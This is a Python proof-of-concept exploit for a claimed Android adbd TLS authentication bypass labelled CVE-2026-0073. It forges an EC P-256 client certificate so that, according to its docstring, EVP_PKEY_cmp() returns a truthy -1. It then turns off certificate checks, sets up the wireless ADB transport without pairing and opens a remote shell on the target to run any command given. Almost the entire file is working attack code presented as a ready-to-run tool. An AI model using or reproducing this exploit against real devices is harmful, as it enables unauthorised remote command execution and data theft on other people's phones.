#!/usr/bin/env python3
"""CVE-2026-0073 — Android adbd EVP_PKEY_cmp() TLS auth bypass.
A non-RSA (EC P-256) client cert makes EVP_PKEY_cmp() return -1 (truthy),
so adbd authorizes the TLS transport without pairing. Zero-click once
wireless ADB is on and any RSA key is already trusted."""
import os, ssl, sys, socket, struct, tempfile, datetime
from typing import Optional

ADB_VERSION = 0x01000001
ADB_MAXDATA = 256 * 1024
ADB_BANNER  = b"host::features=shell_v2,cmd,stat_v2,ls_v2,apex,abb,sendrecv_v2,delayed_ack"
CMD_CNXN = 0x4E584E43; CMD_STLS = 0x534C5453; CMD_AUTH = 0x41555448
CMD_OPEN = 0x4E45504F; CMD_OKAY = 0x59414B4F; CMD_WRTE = 0x45545257

def pack(cmd, a0, a1, data=b""):
    return struct.pack("<IIIIII", cmd, a0, a1, len(data),
                       sum(data) & 0xFFFFFFFF, cmd ^ 0xFFFFFFFF) + data

def _exact(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c: raise ConnectionError("closed")
        b += c
    return b

def recv(s):
    cmd, a0, a1, ln, _c, _m = struct.unpack("<IIIIII", _exact(s, 24))
    return cmd, a0, a1, (_exact(s, ln) if ln else b"")

def ec_cert():
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID
    k = ec.generate_private_key(ec.SECP256R1())
    n = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u"adbkey")])
    now = datetime.datetime.now(datetime.timezone.utc)
    c = (x509.CertificateBuilder().subject_name(n).issuer_name(n)
         .public_key(k.public_key()).serial_number(x509.random_serial_number())
         .not_valid_before(now).not_valid_after(now + datetime.timedelta(days=1))
         .sign(k, hashes.SHA256()))
    return (c.public_bytes(serialization.Encoding.PEM),
            k.private_bytes(serialization.Encoding.PEM,
                            serialization.PrivateFormat.TraditionalOpenSSL,
                            serialization.NoEncryption()))

class ADBBypass:
    def __init__(self, host, port=5555, verbose=True):
        self.host, self.port, self.v = host, port, verbose
        self.sock = self.tls = None; self._lid = 1; self._rid = None

    def _log(self, m):
        if self.v: print(f"[*] {m}")

    def run(self, command: Optional[str] = None):
        self.sock = socket.create_connection((self.host, self.port), timeout=10)
        self.sock.sendall(pack(CMD_CNXN, ADB_VERSION, ADB_MAXDATA, ADB_BANNER))
        hist = {}
        for _ in range(8):
            cmd, a0, a1, d = recv(self.sock)
            if cmd == CMD_CNXN: continue
            hist[cmd] = (a0, a1, d)
            if cmd in (CMD_STLS, CMD_AUTH): break
        if CMD_STLS not in hist: raise RuntimeError("no STLS (non-wireless adbd?)")
        self.sock.sendall(pack(CMD_STLS, hist[CMD_STLS][0], 0))

        cert_pem, key_pem = ec_cert()
        cf = tempfile.NamedTemporaryFile(delete=False, suffix=".pem"); cf.write(cert_pem); cf.close()
        kf = tempfile.NamedTemporaryFile(delete=False, suffix=".pem"); kf.write(key_pem); kf.close()
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ctx.maximum_version = ssl.TLSVersion.TLSv1_3
            ctx.load_cert_chain(cf.name, kf.name)
            self.tls = ctx.wrap_socket(self.sock, server_hostname=self.host)
            self._log(f"TLS {self.tls.version()} — auth bypassed")
        finally:
            os.unlink(cf.name); os.unlink(kf.name)

        for _ in range(6):
            cmd, *_ = recv(self.tls)
            if cmd == CMD_CNXN: break
        self._log("transport online")

        payload = (f"shell:{command}\x00" if command else "shell:\x00").encode()
        self.tls.sendall(pack(CMD_OPEN, self._lid, 32 * 1024 * 1024, payload))
        cmd, a0, _a1, _d = recv(self.tls)
        if cmd != CMD_OKAY: raise RuntimeError(f"OPEN rejected {cmd:#x}")
        self._rid = a0
        self._log("shell opened")
        if command:
            self.tls.sendall(pack(CMD_WRTE, self._lid, self._rid, command.encode()))
            self._log("command sent")
        return self

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5555
    cmd = sys.argv[3] if len(sys.argv) > 3 else None
    ADBBypass(host, port).run(cmd)

if __name__ == "__main__":
    main()
